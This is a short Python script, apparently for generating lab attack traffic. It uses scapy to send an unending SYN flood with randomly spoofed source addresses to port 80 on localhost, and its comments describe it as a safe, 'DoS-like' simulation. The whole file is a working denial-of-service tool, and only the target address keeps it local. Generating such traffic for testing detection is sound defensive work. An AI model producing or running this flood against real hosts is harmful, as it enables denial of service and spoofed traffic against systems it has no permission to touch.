from scapy.all import IP, TCP, send
import random
import time

target_ip = "127.0.0.1"   # Local machine (safe)
target_port = 80          # HTTP port

print("🚨 Attack traffic generation started...")
print("Press CTRL + C to stop")

try:
    while True:
        packet = IP(
            src=f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
            dst=target_ip
        ) / TCP(
            sport=random.randint(1024,65535),
            dport=target_port,
            flags="S"
        )

        send(packet, verbose=False)
        time.sleep(0.01)   # High frequency packets (DoS-like)

except KeyboardInterrupt:
    print("\n🛑 Attack simulation stopped")